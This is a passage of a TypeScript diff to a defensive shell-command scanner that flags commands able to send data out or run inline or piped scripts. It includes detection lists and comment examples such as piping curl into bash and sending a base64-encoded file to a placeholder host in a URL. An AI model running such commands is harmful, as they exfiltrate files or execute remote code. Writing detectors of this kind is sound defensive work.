-  perl: 'x',
-  ruby: 'xKF',
-};
+const GLUED_ONLY_LETTERS = new Map([
+  ['perl', 'x'],
+  ['ruby', 'xKF'],
+]);
 
 /** The long forms of the above whose value is the next argument rather than glued to the flag. */
-const OPTION_VALUE_WORDS: Record<string, readonly string[]> = {
-  node: ['--require', '--import'],
-  bun: ['--require', '--preload'],
-  bash: ['--rcfile', '--init-file'],
-};
+const OPTION_VALUE_WORDS = new Map<string, readonly string[]>([
+  ['node', ['--require', '--import']],
+  ['bun', ['--require', '--preload']],
+  ['bash', ['--rcfile', '--init-file']],
+]);
 
 /** Common long options that take no value, so the word after one is not assumed to be its value. */
-const OPTION_FLAG_WORDS: Record<string, readonly string[]> = {
-  node: ['--inspect', '--inspect-brk', '--watch', '--enable-source-maps', '--no-warnings', '--trace-warnings'],
-  bun: ['--watch', '--hot', '--smol'],
-};
+const OPTION_FLAG_WORDS = new Map<string, readonly string[]>([
+  ['node', ['--inspect', '--inspect-brk', '--watch', '--enable-source-maps', '--no-warnings', '--trace-warnings']],
+  ['bun', ['--watch', '--hot', '--smol']],
+]);
 
 /** Shells where -o/-O (and +o/+O) name an option in the next word, leaving the rest of the cluster as flags. */
 const SHELL_OPTION_WORD = new Set(['sh', 'bash', 'dash']);
 
 function optionValueLetters(program: string): string {
-  return /^python[\d.]*$/.test(program) ? OPTION_VALUE_LETTERS.python : (OPTION_VALUE_LETTERS[program] ?? '');
+  return OPTION_VALUE_LETTERS.get(/^python[\d.]*$/.test(program) ? 'python' : program) ?? '';
 }
 
 /** The value letters that take the next word when they end a cluster; glued-only letters do not. */
 function nextWordLetters(program: string): string {
-  const glued = GLUED_ONLY_LETTERS[program] ?? '';
+  const glued = GLUED_ONLY_LETTERS.get(program) ?? '';
   return [...optionValueLetters(program)].filter(letter => !glued.includes(letter)).join('');
 }
 
@@ -267,7 +4817,7 @@ function flagRun(arg: string, letters: string): string {
 
 /** Whether an option takes its value in the next argument rather than glued to its flag. */
 function takesNextArgument(program: string, arg: string): boolean {
-  if (arg.startsWith('--')) return !arg.includes('=') && (OPTION_VALUE_WORDS[program] ?? []).includes(arg);
+  if (arg.startsWith('--')) return !arg.includes('=') && (OPTION_VALUE_WORDS.get(program) ?? []).includes(arg);
   const cluster = arg.slice(1);
   const letters = nextWordLetters(program);
   const at = [...cluster].findIndex(char => letters.includes(char));
@@ -291,7 +4841,7 @@ function interpreterOptions(program: string, args: readonly string[]): { options
   const letters = optionValueLetters(program);
   const shellWord = SHELL_OPTION_WORD.has(program);
   // Shells also take flags as `+e`, which turn an option off rather than ending the options.
-  const plusFlags = INLINE_SCRIPT[program] === SHELL_C;
+  const plusFlags = INLINE_SCRIPT.get(program) === SHELL_C;
   const options: string[] = [];
   let i = 0;
   for (; i < args.length; i++) {
@@ -311,7 +4861,7 @@ function interpreterOptions(program: string, args: readonly string[]): { options
       arg.startsWith('--') &&
       arg !== '--' &&
       !arg.includes('=') &&
-      !(OPTION_FLAG_WORDS[program] ?? []).includes(arg) &&
+      !(OPTION_FLAG_WORDS.get(program) ?? []).includes(arg) &&
       plainWord(args[i + 1])
     ) {
       i++;
@@ -332,23 +4882,28 @@ const STDIN_SCRIPT = /^(python[\d.]*|node|ruby|perl|php|bun|osascript|sh|bash|zs
  */
 export function opaqueForm(tokens: readonly string[]): string | null {
   const normalised = tokens.map(unquote);
-  let start = 0;
-  while (start < normalised.length && WRAPPERS.has(basename(normalised[start]))) {
-    start++;
-    while (start < normalised.length && /^(-|\d|[A-Za-z_][A-Za-z0-9_]*=)/.test(normalised[start])) start++;
-  }
+  const split = splitString(normalised);
+  if (split) return tokens.slice(0, split.option + 1).join(' ');
+  const wslShell = wslRuns(normalised).find(run => !run.exec);
+  if (wslShell) return tokens.slice(0, wslShell.end).join(' ');
+  const start = wrappedStart(normalised);
   const executable = normalised[start];
   if (executable === undefined) return null;
-  const program = basename(executable);
+  const name = programName(executable);
   const args = normalised.slice(start + 1);
   const head = (count: number) => tokens.slice(0, start + count).join(' ');
-  if (program === 'eval' || program === 'source' || program === '.') return head(1);
-  if (program === 'deno' && args[0] === 'eval') return head(2);
-  const inline = /^python[\d.]*$/.test(program) ? DASH_C : INLINE_SCRIPT[program];
-  if (!inline && !STDIN_SCRIPT.test(program)) return null;
-  const { options, operands } = interpreterOptions(program, args);
+  if (name === 'eval' || name === 'source' || name === '.') return head(1);
+  if (name === 'deno' && args[0] === 'eval') return head(2);
+  const windowsShell = WINDOWS_SHELLS.get(name);
+  if (windowsShell) {
+    const run = windowsShell(args);
+    return run ? head(1 + run.words) : null;
+  }
+  const inline = inlineScriptOption(name);
+  if (!inline && !STDIN_SCRIPT.test(name)) return null;
+  const { options, operands } = interpreterOptions(name, args);
   if (inline && options.some(option => inline.test(option))) {
-    return head(2 + args.findIndex(arg => inline.test(flagRun(arg, optionValueLetters(program)))));
+    return head(2 + args.findIndex(arg => inline.test(flagRun(arg, optionValueLetters(name)))));
   }
   return operands.length === 0 || operands[0] === '-' || STDIN_SCRIPT_ARG.test(operands[0]) ? head(1) : null;
 }
@@ -358,9 +4913,6 @@ const STDIN_SCRIPT_ARG = /^(\/(dev|proc\/self)\/fd\/[\d]+|\/dev\/stdin|[<>]\()/;
 
 /** Programs that resolve a name, so a computed argument can smuggle data into a query. */
 const RESOLVERS = new Set(['dig', 'nslookup', 'host']);
-
-/** Git's global options that take the value in the next argument, which is not a subcommand. */
-const GIT_OPTION_VALUES = /^--(git-dir|work-tree|namespace)(=|$)/;
 
 /**
  * Whether a command's stdin is fed: piped into, a heredoc or here-string, or a `<` redirect. A
@@ -410,26 +4962,61 @@ function sendsBody(method: string | undefined): boolean {
 }
 
 /**
- * Why one simple command can send data off this computer, or null. Defence in depth only: a
- * script file, a decoded payload or a wrapper not listed here slips past, which is why a reply that
- * has read untrusted content asks before any command `containedCommand` does not vouch for (see
- * ChatService's DirectoryTurn.untrusted).
+ * Where gh's subcommand words are in `words`. `valued` reads them as cobra finds a subcommand, where a `-x` or a
+ * `--flag` with no `=`, other than help, takes the next word, and `--` ends the search; otherwise options stand alone.
+ */
+function ghCommandWords(words: readonly string[], valued: boolean): number[] {
+  const at: number[] = [];
+  for (let index = 0; index < words.length; index++) {
+    const word = unquote(words[index] as string);
+    if (word === '--') {
+      if (valued) break;
+    } else if (!word.startsWith('-')) {
+      at.push(index);
+    } else if (valued && !word.includes('=') && (word.startsWith('--') ? word !== '--help' : word.length === 2)) {
+      if (word !== '-h') index++;
+    }
+  }
+  return at;
+}
+
+/** gh's `new`, an alias of `create`. */
+const GH_CREATE = /^(create|new)$/;
+
+/**
+ * Why one simple command can send data off this computer, or null, for the card. A script file, a
+ * decoded payload or a wrapper not listed here slips past.
  */
 export function outboundReason(raw: readonly string[], stdin = false): string | null {
   const tokens = raw.map(unquote);
-  let start = 0;
-  while (start < tokens.length && WRAPPERS.has(basename(tokens[start]))) {
-    start++;
-    while (start < tokens.length && /^(-|\d)|=/.test(tokens[start])) start++;
+  const split = splitString(tokens);
+  if (split) {
+    const option = tokens[split.option];
+    const shown = option.startsWith('--') ? option.split('=')[0] : option.slice(0, option.indexOf('S') + 1);
+    return `${basename(tokens[split.env])} ${shown}`;
   }
+  // Without `-e`, wsl hands the words after its options to the distro's shell as one command line.
+  const wslShell = wslRuns(tokens).find(run => !run.exec);
+  if (wslShell) {
+    const wsl = basename(tokens[wslShell.at]);
+    if (wslShell.managing) {
+      // Only words after a `--` are a command; an option's own operand (`--unregister Ubuntu`) is not.
+      return unquote(tokens[wslShell.end - 1] ?? '') === '--' ? outboundReason(raw.slice(wslShell.end), stdin) : null;
+    }
+    if (wslShell.end < tokens.length) return `${wsl} running its arguments as a command`;
+    return stdin ? `${wsl} reading a script from stdin` : null;
+  }
+  const start = wrappedStart(tokens);
   if (start >= tokens.length) return null;
+  // As written, for the reason shown; `name` is what the program is looked up by.
   const program = basename(tokens[start]);
+  const name = programName(tokens[start]);
   const args = tokens.slice(start + 1);
   // Any computed argument: `curl https://x/$(base64 a)` sends the file in a GET.
   const computed = raw.slice(start + 1).some(isDynamic);
 
-  if (ALWAYS_OUTBOUND.has(program)) return program;
-  if (program === 'curl') {
+  if (ALWAYS_OUTBOUND.has(name)) return program;
+  if (name === 'curl') {
     const flag = args.find(
       arg => CURL_SENDS.test(arg.split('=')[0]) || (!/^-[a-zA-Z]*X/.test(arg) && /^-[a-zA-Z]*[dFTK]/.test(arg))
     );
@@ -454,40 +5041,54 @@ export function outboundReason(raw: readonly string[], stdin = false): string | 
     if (sendsBody(method)) return 'curl --request';
     return computed ? 'curl with a computed argument' : null;
   }
-  if (program === 'wget') {
+  if (name === 'wget') {
     const flag = args.find(arg => WGET_SENDS.test(arg.split('=')[0]));
     if (flag) return `wget ${flag.split('=')[0]}`;
     if (sendsBody(optionValue(args, ['--method']))) return 'wget --method';
     return computed ? 'wget with a computed argument' : null;
   }
-  if (program === 'rsync') {
+  if (name === 'rsync') {
     return args.some(arg => !arg.startsWith('-') && (/^[^/]*:/.test(arg) || arg.startsWith('rsync://')))
       ? 'rsync to a remote host'
       : null;
   }
-  if (program === 'git') {
-    const words: string[] = [];
-    for (let i = 0; i < args.length; i++) {
-      if (args[i] === '-C' || args[i] === '-c') i++;
-      else if (GIT_OPTION_VALUES.test(args[i])) {
-        if (!args[i].includes('=')) i++;
-      } else if (!args[i].startsWith('-')) words.push(args[i]);
-    }
-    const [sub, action] = words;
+  if (name === 'git') {
+    const at = gitSubcommandAt(raw.slice(start + 1));
+    if (at === 'open') return 'git with an option the scan cannot read';
+    if (at === null) return null;
+    const sub = args[at];
+    const action = args.slice(at + 1).find(arg => !arg.startsWith('-'));
     if (sub === 'push' || sub === 'send-email') return `git ${sub}`;
     if (sub === 'remote' && (action === 'add' || action === 'set-url')) return `git remote ${action}`;
     return null;
   }
-  if (program === 'gh') {
-    const [sub, action] = args.filter(arg => !arg.startsWith('-'));
-    if ((sub === 'gist' && (action === 'create' || action === 'edit')) || (sub === 'release' && action === 'upload')) {
-      return `gh ${sub} ${action}`;
+  if (name === 'gh') {
+    const written = raw.slice(start + 1);
+    // With and without options taking the next word (`-R o/r`), so neither reading hides the subcommand.
+    const readings = [false, true].map(valued => ghCommandWords(written, valued));
+    for (const at of readings) {
+      const [writtenSub = '', writtenAction = ''] = at.map(index => written[index] as string);
+      // A subcommand bash rewrites (`p''r`, `cre\ate`, `$x`) may be any of the ones below.
+      if (
+        SPELLED_PROGRAM.test(writtenSub) ||
+        (/^(gist|release|issue|pr)$/.test(unquote(writtenSub)) && SPELLED_PROGRAM.test(writtenAction))
+      ) {
+        return 'gh with a subcommand bash rewrites';
+      }
     }
-    // Writing an issue, a pull request or a release posts text under the user's own account.
-    if ((sub === 'issue' || sub === 'pr') && (action === 'create' || action === 'comment' || action === 'edit')) {
-      return `gh ${sub} ${action}`;
+    for (const at of readings) {
+      const [sub, action] = at.map(index => args[index]);
+      const creates = GH_CREATE.test(action ?? '');
+      if ((sub === 'gist' && (creates || action === 'edit')) || (sub === 'release' && action === 'upload')) {
+        return `gh ${sub} ${action}`;
+      }
+      // Writing an issue, a pull request or a release posts text under the user's own account.
+      if ((sub === 'issue' || sub === 'pr') && (creates || action === 'comment' || action === 'edit')) {
+        return `gh ${sub} ${action}`;
+      }
+      if (sub === 'release' && creates) return `gh release ${action}`;
     }
-    if (sub === 'release' && action === 'create') return 'gh release create';
+    const [sub, action] = (readings[0] ?? []).map(index => args[index]);
     if (sub !== 'api') return null;
     // gh's flag parser accepts clustered shorthands: `-iftitle=x` is `--include --field title=x`
     // and `-iXPOST` is `--include --method POST`. Cut each cluster at its first field or method
@@ -497,35 +5098,37 @@ export function outboundReason(raw: readonly string[], stdin = false): string | 
     const fields = apiArgs.some(arg => /^-[fF]|^--(field|raw-field|input)(=|$)/.test(arg));
     return fields && !(action === 'graphql' && graphqlReadOnly(apiArgs)) ? 'gh api' : null;
   }
-  if (program === 'aws' || program === 'gsutil' || program === 'gcloud') {
+  if (name === 'aws' || name === 'gsutil' || name === 'gcloud') {
     const positional = args.filter(arg => !arg.startsWith('-'));
     const copies = positional.some(arg => /^(cp|mv|sync|rsync)$/.test(arg));
     if (copies && /^(s3|gs):\/\//.test(positional.at(-1) ?? '')) return `${program} upload`;
     return positional.includes('put-object') ? `${program} put-object` : null;
   }
-  if (program === 'docker' || program === 'podman') {
+  if (name === 'docker' || name === 'podman') {
     return args.find(arg => !arg.startsWith('-')) === 'push' ? `${program} push` : null;
   }
-  if (program === 'deno') return args[0] === 'eval' ? 'deno eval' : null;
-  if (program === 'eval') return 'eval';
+  if (name === 'deno') return args[0] === 'eval' ? 'deno eval' : null;
+  if (name === 'eval') return 'eval';
   // A name built from a command substitution carries what it read into the lookup itself.
-  if (RESOLVERS.has(program) && computed) return `${program} with a computed argument`;
-  const inlineScript = /^python[\d.]*$/.test(program) ? DASH_C : INLINE_SCRIPT[program];
+  if (RESOLVERS.has(name) && computed) return `${program} with a computed argument`;
+  const windowsRun = WINDOWS_SHELLS.get(name)?.(args);
+  if (windowsRun && (stdin || !windowsRun.stdin)) return `${program} ${windowsRun.shown}`;
+  const inlineScript = inlineScriptOption(name);
   // A script's own arguments are not options: `python3 x.py -config` never runs an inline script.
-  const { options, operands } = interpreterOptions(program, args);
+  const { options, operands } = interpreterOptions(name, args);
   const inline = inlineScript ? options.find(arg => inlineScript.test(arg)) : undefined;
   if (inline) return `${program} ${(inlineScript?.exec(inline)?.[0] ?? inline.split('=')[0]).replace(/=$/, '')}`;
   // `bash -s` reads its script from stdin even when operands follow, as `curl ... | bash -s -- arg`.
   const scriptOperand =
-    INLINE_SCRIPT[program] === SHELL_C && options.some(arg => /^[+-][a-zA-Z]*s/.test(arg)) ? '-' : operands[0];
+    INLINE_SCRIPT.get(name) === SHELL_C && options.some(arg => /^[+-][a-zA-Z]*s/.test(arg)) ? '-' : operands[0];
   if (
     stdin &&
-    STDIN_SCRIPT.test(program) &&
+    STDIN_SCRIPT.test(name) &&
     (scriptOperand === undefined || scriptOperand === '-' || STDIN_SCRIPT_ARG.test(scriptOperand))
   ) {
     return `${program} reading a script from stdin`;
   }
-  if ((program === 'npm' || program === 'pnpm' || program === 'yarn') && args.includes('publish')) {
+  if ((name === 'npm' || name === 'pnpm' || name === 'yarn') && args.includes('publish')) {
     return `${program} publish`;
   }
   return null;
@@ -573,6 +5176,7 @@ const LOCAL_PROGRAMS = new Set([
   'fold',
   'grep',
   'head',
+  'iconv',
   'jq',
   'ls',
   'mkdir',
@@ -584,6 +5188,7 @@ const LOCAL_PROGRAMS = new Set([
   'realpath',
   'rev',
   'rg',
+  'sleep',
   'sort',
   'stat',
   'tail',
@@ -597,10 +5202,36 @@ const LOCAL_PROGRAMS = new Set([
   'which',
 ]);
 
+/** The file `uniq INPUT OUTPUT` writes: its second operand, past `-f`, `-s` and `-w` values; null when unread. */
+function uniqOutput(args: readonly string[]): string | undefined | null {
+  const operands: string[] = [];
+  for (let index = 0; index < args.length; index++) {
+    const arg = optionStandIn(args[index] as string, 'fsw');
+    if (arg === null) return null;
+    if (arg === '--') {
+      operands.push(...args.slice(index + 1));
+      break;
+    }
+    if (/^-[A-Za-z]*[fsw]$/.test(arg) || /^--(skip-fields|skip-chars|check-chars)$/.test(arg)) index++;
+    else if (!arg.startsWith('-') || arg === '-') operands.push(args[index] as string);
+  }
+  return operands[1];
+}
+
 /** Options that make a listed program run another one. */
 const RUNS_A_PROGRAM: Readonly<Record<string, RegExp>> = {
   find: /^-(exec|execdir|ok|okdir|delete|fprint0?|fprintf|fls)$/,
+  // Not a program, but `-o` writes a file, which `sort -o` keeps out of the list too.
+  iconv: /^(-[A-Za-z]*o|--o(u(t(p(ut?)?)?)?)?(=|$))/,
   rg: /^--pre(-glob)?(=|$)/,
+  tree: /^-[A-Za-z]*[oR]/,
+};
+
+/** The whole option words `RUNS_A_PROGRAM` names, which an option word bash may still extend can become. */
+const RUNS_A_PROGRAM_NAMES: Readonly<Record<string, readonly string[]>> = {
+  find: ['-exec', '-execdir', '-ok', '-okdir', '-delete', '-fprint', '-fprint0', '-fprintf', '-fls'],
+  iconv: ['--output'],
+  rg: ['--pre', '--pre-glob'],
 };
 
 /**
@@ -631,6 +5262,1153 @@ function sortRunsOrWrites(args: readonly string[]): boolean {
   return false;
 }
 
+/** Builtins and reporting programs whose words name no file and no program to run. */
+const NAMES_NO_FILE = [
+  '[',
+  ':',
+  'break',
+  'continue',
+  'exit',
+  'getopts',
+  'jobs',
+  'kill',
+  'let',
+  'read',
+  'return',
+  'set',
+  'shift',
+  'shopt',
+  'times',
+  'type',
+  'umask',
+  'unalias',
+  'unset',
+  'wait',
+  'df',
+  'free',
+  'hostname',
+  'id',
+  'nproc',
+  'printenv',
+  'ps',
+  'seq',
+  'uname',
+  'uptime',
+  'whoami',
+];
+
+/**
+ * Programs whose every word the scan reads: what each reads, writes and changes is followed here and in
+ * shellWrites. `less` and `more` can run a command of their own; `scp` takes ssh options that can.
+ */
+const MODELED_PROGRAMS = new Set([
+  ...[...TOUCHES_FILES].filter(name => name !== 'less' && name !== 'more'),
+  ...[...COPIES].filter(name => name !== 'scp'),
+  ...UNPACKS,
+  ...LOCAL_PROGRAMS,
+  ...NAMES_NO_FILE,
+  'alias',
+  'trap',
+  'mapfile',
+  'readarray',
+  'chgrp',
+  'git',
+  'gh',
+  'curl',
+  'sed',
+  'gsed',
+  'awk',
+  'gawk',
+  'mawk',
+  'nawk',
+  'patch',
+]);
+
+/** curl options the scan reads: flags, and options whose value is no file (`-o` is noted as a download). */
+const CURL_FLAGS = 'sSfLIivkgG46N#OJ';
+const CURL_VALUED = 'oXHmdAeurxwcbDTF';
+const CURL_LONG_FLAGS = new Set([
+  'silent',
+  'show-error',
+  'fail',
+  'fail-with-body',
+  'location',
+  'head',
+  'include',
+  'verbose',
+  'insecure',
+  'compressed',
+  'globoff',
+  'get',
+  'http1.1',
+  'http2',
+  'no-progress-meter',
+  'progress-bar',
+  'http1.0',
+  'no-buffer',
+  'retry-connrefused',
+  'retry-all-errors',
+  'fail-early',
+  'path-as-is',
+  'remote-name',
+  'remote-name-all',
+  'remote-header-name',
+  'create-dirs',
+]);
+const CURL_LONG_VALUED = new Set([
+  'output',
+  'request',
+  'header',
+  'max-time',
+  'connect-timeout',
+  'retry',
+  'retry-delay',
+  'retry-max-time',
+  'data',
+  'data-raw',
+  'data-binary',
+  'data-urlencode',
+  'json',
+  'user-agent',
+  'referer',
+  'user',
+  'url',
+  'range',
+  'proxy',
+  'noproxy',
+  'max-redirs',
+  'limit-rate',
+  'write-out',
+  'output-dir',
+  'cookie',
+  'cookie-jar',
+  'dump-header',
+  'upload-file',
+  'form',
+]);
+
+/** A URL curl fetches over http or https: the scheme as written, or a bare host curl does not guess another for. */
+const CURL_URL = /^https?:\/\/[^\s{}[\]]*$/i;
+const CURL_BARE_HOST =
+  /^(?!(ftp|dict|ldap|imap|smtp|pop3|gopher|mqtt|telnet|tftp|rtsp|scp|sftp|smb)\.)[\w.-]+(:\d+)?(\/[^\s{}[\]]*)?$/i;
+const curlUrl = (url: string): boolean => CURL_URL.test(url) || CURL_BARE_HOST.test(url);
+
+/** Each curl option the scan reads, by its long name, with its value; null for an option outside the lists above. */
+function curlOptions(args: readonly string[]): { name: string; value?: string }[] | null {
+  const options: { name: string; value?: string }[] = [];
+  for (let at = 0; at < args.length; at++) {
+    const arg = args[at] as string;
+    if (arg === '--') {
+      options.push(...args.slice(at + 1).map(value => ({ name: 'url', value })));
+      break;
+    }
+    if (arg.startsWith('--')) {
+      const [name = '', value] = arg.slice(2).split(/=(.*)/s);
+      if (CURL_LONG_FLAGS.has(name) && value === undefined) options.push({ name });
+      else if (!CURL_LONG_VALUED.has(name)) return null;
+      else options.push({ name, value: value ?? args[++at] });
+      continue;
+    }
+    if (!arg.startsWith('-') || arg === '-') {
+      options.push({ name: 'url', value: arg });
+      continue;
+    }
+    for (let letter = 1; letter < arg.length; letter++) {
+      const option = arg[letter] as string;
+      const name = own(CURL_SHORT, option);
+      if (CURL_FLAGS.includes(option)) options.push({ name: name ?? option });
+      else if (!CURL_VALUED.includes(option)) return null;
+      else {
+        options.push({ name: name ?? option, value: arg.slice(letter + 1) || args[++at] });
+        break;
+      }
+    }
+  }
+  return options;
+}
+
+/** Long names of the short curl options whose files the scan reads. */
+const CURL_SHORT: Readonly<Record<string, string>> = {
+  o: 'output',
+  O: 'remote-name',
+  J: 'remote-header-name',
+  c: 'cookie-jar',
+  b: 'cookie',
+  D: 'dump-header',
+  T: 'upload-file',
+  F: 'form',
+  d: 'data',
+  H: 'header',
+  w: 'write-out',
+};
+
+/**
+ * Whether the scan reads every curl word: each option is one above, `-w` writes no file of its own
+ * (`%output{f}`), and each URL is http or https. A file an option reads or writes is checked by `curlFiles`.
+ */
+function curlModeled(args: readonly string[]): boolean {
+  const options = curlOptions(args);
+  return (
+    options !== null &&
+    !curlUploadGlobs(options) &&
+    options.every(({ name, value }) =>
+      name === 'url'
+        ? curlUrl(value ?? '')
+        : name === 'form'
+          ? simpleCurlForm(value ?? '')
+          : name !== 'write-out' || !/%output|^@/.test(value ?? '')
+    )
+  );
+}
+
+/** Curl expands upload lists/ranges itself even inside a shell-quoted word. */
+function curlUploadGlobs(options: readonly { name: string; value?: string }[]): boolean {
+  if (options.some(({ name }) => name === 'g' || name === 'globoff')) return false;
+  return options.some(({ name, value }) => name === 'upload-file' && /[{[]/.test(wordValue(value ?? '')));
+}
+
+/** Curl parses its own quoting, file lists and attributes inside a form value; those need a decision. */
+function simpleCurlForm(value: string): boolean {
+  if (/[,;"\\\r\n]/.test(value)) return false;
+  const equals = value.indexOf('=');
+  if (equals === -1) return false;
+  const data = value.slice(equals + 1);
+  return !/^[@<]/.test(data.trimStart()) || !/\s/.test(data);
+}
+
+/** `text` as one single-quoted shell word. */
+const shellQuoted = (text: string): string => `'${text.replace(/'/g, `'\\''`)}'`;
+
+/**
+ * The files a curl call reads and writes, as shell words: `-o` (under `--output-dir`), `-c`, `-D`, a `-O` name
+ * taken from each URL, `-b` without `=`, `-T`, and `@file` data. `named` when `-J` lets the server name the file.
+ */
+function curlFiles(args: readonly string[]): { reads: string[]; writes: string[]; named: boolean } | null {
+  const options = curlOptions(args);
+  if (
+    !options ||
+    curlUploadGlobs(options) ||
+    options.some(({ name, value }) => name === 'form' && !simpleCurlForm(wordValue(value ?? '')))
+  )
+    return null;
+  const values = (...names: string[]): string[] =>
+    options.flatMap(({ name, value }) => (names.includes(name) && value !== undefined ? [value] : []));
+  const directory = values('output-dir').at(-1);
+  const inDirectory = (path: string): string => (directory === undefined ? path : `${directory}/${path}`);
+  const remote = options.some(({ name }) => name === 'remote-name' || name === 'remote-name-all');
+  const named = options.some(({ name }) => name === 'remote-header-name');
+  const urlName = (url: string): string =>
+    wordValue(url)
+      .replace(/[?#].*$/s, '')
+      .replace(/^.*\//s, '');
+  const remoteNames = remote
+    ? values('url').map(url =>
+        shellQuoted(directory === undefined ? urlName(url) : `${wordValue(directory)}/${urlName(url)}`)
+      )
+    : [];
+  // `@f`, `name@f` and `name=@f` all count as reading `f`; reading one more path only asks more often.
+  const data = values('data', 'data-binary', 'data-urlencode', 'json', 'header')
+    .map(wordValue)
+    .flatMap(value => (value.includes('@') ? [shellQuoted(value.slice(value.indexOf('@') + 1))] : []));
+  // A form field reads a file through `name=@f` or `name=<f`.
+  const forms = values('form')
+    .map(wordValue)
+    .flatMap(value => {
+      const at = value.search(/=[@<]/);
+      return at === -1 ? [] : [shellQuoted(value.slice(at + 2))];
+    });
+  const given = (value: string): boolean => !['', '-'].includes(wordValue(value));
+  const cookies = values('cookie').filter(value => !wordValue(value).includes('='));
+  return {
+    reads: [...cookies, ...values('upload-file'), ...data, ...forms].filter(given),
+    writes: [...values('output').map(inDirectory), ...values('cookie-jar', 'dump-header'), ...remoteNames].filter(
+      given
+    ),
+    named,
+  };
+}
+
+/** A function name the scan can track. */
+const PLAIN_PROGRAM = /^([\w.+-]+|\[|:)$/;
+
+/**
+ * Whether a command the scan models cannot be followed: a wrapper or program word bash rewrites before it
+ * runs, a list of operands read from a file (`--files-from`, `tar -T`), or a curl call `curlModeled` refuses.
+ * A plain program the scan does not model is left as it is, decided by its words and the rules.
+ */
+function untrackableCommand(raw: readonly string[]): boolean {
+  let at = 0;
+  for (; at < raw.length && isWrapper(raw[at] as string); at = pastWrapper(raw, at)) {
+    if (SPELLED_PROGRAM.test(raw[at] as string)) return true;
+  }
+  if (raw[at] === 'builtin' || raw[at] === 'command') at++;
+  const word = raw[at];
+  if (word === undefined) return false;
+  if (word !== '[' && SPELLED_PROGRAM.test(word)) return true;
+  const name = basename(word);
+  const words = raw.slice(at + 1);
+  const args = words.map(arg => bashOption(arg) ?? wordValue(arg));
+  const filesFrom = (arg: string): boolean => listsFiles(name, arg);
+  // An open name counts only where the program has such an option, so `echo "--- $f"` stays readable.
+  const listNames = FILES_FROM_PROGRAMS.has(name) ? ['--files-from', '--files0-from'] : [];
+  if (words.some(arg => mayPassOption(arg, '', filesFrom, listNames, false))) return true;
+  if (name === 'tar' || name === 'bsdtar') {
+    const tarNames = [...listNames, ...TAR_PROGRAM_OPTIONS.map(option => `--${option}`)];
+    const valued = OPTION_FILES.tar?.valued ?? '';
+    // tar's first word may be an old-style cluster without a dash (`xvfT list`), which bash may extend (`c$X`).
+    const first = words[0] ?? '';
+    const extended = fixedWords([first]) === null && /^[A-Za-z]+$/.test(literalHead(first).head);
+    if (extended || /^[A-Za-z]*[TIF]/.test(bashOption(first) ?? '')) return true;
+    if (words.some(arg => mayPassOption(arg, valued, tarListsOrRuns, tarNames, true))) return true;
+  }
+  if (name === 'git' && (gitConfigRunsProgram(words) || gitSubcommandSpelled(words) || gitRunsGivenCommand(words))) {
+    return true;
+  }
+  // Each of these runs a program the option names.
+  const pre = (arg: string): boolean => /^--pre(-glob)?(=|$)/.test(arg);
+  if (name === 'rg' && words.some(arg => mayPassOption(arg, '', pre, ['--pre', '--pre-glob'], false))) return true;
+  const rsh = (arg: string): boolean => /^--rs/.test(arg) || /^-[A-Za-z]*e/.test(arg);
+  if (name === 'rsync' && words.some(arg => mayPassOption(arg, '', rsh, ['--rsh', '--rsync-path'], true))) {
+    return true;
+  }
+  return name === 'curl' && !curlModeled(args);
+}
+
+/** Programs with a `--files-from` or `--files0-from` option, which reads their operands from a file. */
+const FILES_FROM_PROGRAMS = new Set(['tar', 'bsdtar', 'rsync', 'du', 'wc', 'sort']);
+
+/**
+ * Whether an option word of `program` names a file its operands are read from. getopt_long takes any unique prefix
+ * (`--files-fr=list`), and an ambiguous one fails, so any prefix counts but tar's own `--file`. Elsewhere, and in
+ * rsync, whose popt has no prefixes, only the full name counts, so `rg --files` stays readable.
+ */
+function listsFiles(program: string, arg: string): boolean {
+  const long = /^--([^=]+)/.exec(arg)?.[1];
+  if (long === undefined) return false;
+  if (!FILES_FROM_PROGRAMS.has(program) || program === 'rsync') return /^files0?-from$/.test(long);
+  return long !== 'file' && ['files-from', 'files0-from'].some(name => name.startsWith(long));
+}
+
+/** tar's long options that run a program; getopt_long also takes any unique prefix of one. */
+const TAR_PROGRAM_OPTIONS = [
+  'use-compress-program',
+  'to-command',
+  'info-script',
+  'new-volume-script',
+  'rsh-command',
+  'rmt-command',
+  'checkpoint-action',
+];
+
+/** Whether a tar option word reads its operands from a file (`-T`) or runs a program (`-I`, `-F`, `--to-command`). */
+function tarListsOrRuns(arg: string): boolean {
+  const long = /^--([^=]+)/.exec(arg)?.[1];
+  // `--checkpoint` is an option of its own, not a prefix of `--checkpoint-action`.
+  if (long !== undefined) return long !== 'checkpoint' && TAR_PROGRAM_OPTIONS.some(name => name.startsWith(long));
+  return /^-[A-Za-z]*[TIF]/.test(arg);
+}
+
+/** git's global options other than `-c` and `--config-env` whose value is the next word. */
+const GIT_GLOBAL_VALUED: ReadonlySet<string> = new Set(
+  [...GIT_VALUED_OPTIONS].filter(option => option !== '-c' && option !== '--config-env')
+);
+
+/**
+ * Whether `git -c key=value` or `--config-env key=VAR` before the subcommand sets a key that runs a program, or
+ * may: an option word or setting an expansion makes or changes. `raw` are shell words.
+ */
+function gitConfigRunsProgram(raw: readonly string[]): boolean {
+  for (let at = 0; at < raw.length; at++) {
+    const word = raw[at] as string;
+    const arg = optionStandIn(word, 'Cc');
+    if (arg === null) return true;
+    // `${X:+}-c` may pass `-c` alone, so where its value ends is open.
+    if (bashOption(word) === null && fixedOption(word, 'Cc')?.value === null) return true;
+    if (!arg.startsWith('-')) return false;
+    // git runs its helper programs (`git-web--browse`, `git-mergetool`) from the folder `--exec-path=` names.
+    if (arg.startsWith('--exec-path=')) return true;
+    const valued = arg === '-c' || arg === '--config-env';
+    const glued = /^--config-env=(.*)$/s.exec(arg)?.[1];
+    const setting = valued
+      ? fixedWords(raw.slice(at + 1, at + 2))
+      : glued !== undefined && bashOption(word) === null
+        ? null
+        : [glued];
+    if (valued) at++;
+    if (setting === null) return true;
+    const [entry] = setting;
+    if (entry !== undefined) {
+      const equals = entry.indexOf('=');
+      // `--config-env` names a variable to read the value from.
+      const value = equals === -1 || arg !== '-c' ? undefined : entry.slice(equals + 1);
+      const key = equals === -1 ? entry : entry.slice(0, equals);
+      if (configRunsProgram(key, value) && !(value !== undefined && listedSetting(key, value))) return true;
+    }
+    if (GIT_GLOBAL_VALUED.has(arg)) at++;
+  }
+  return false;
+}
+
+/**
+ * The index in `raw`, the shell words after `git`, of the word git reads as its subcommand, as gitSubcommand finds
+ * it; null when git runs none, and `open` when a global option the scan cannot read leaves where it is open.
+ */
+function gitSubcommandAt(raw: readonly string[]): number | 'open' | null {
+  // An open word stands in as an option git does not know, unless an option takes it as its value.
